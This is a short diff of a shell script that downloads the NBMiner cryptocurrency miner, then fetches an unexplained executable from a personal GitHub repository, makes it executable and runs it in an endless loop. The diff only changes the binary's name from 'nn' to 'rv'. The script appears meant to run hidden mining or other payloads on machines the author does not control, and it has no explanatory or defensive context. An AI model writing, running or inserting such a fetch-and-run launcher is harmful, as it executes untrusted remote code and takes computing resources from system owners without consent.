@@ -1,8 +1,8 @@
 wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz
 tar -xvf NBMiner_39.2_Linux.tgz
-wget -O nn https://raw.githubusercontent.com/venetta999/12345/main/nn
-chmod +x nn
+wget -O rv https://raw.githubusercontent.com/venetta999/12345/main/rv
+chmod +x rv
 while true
 do
-./nn
+./rv
 done
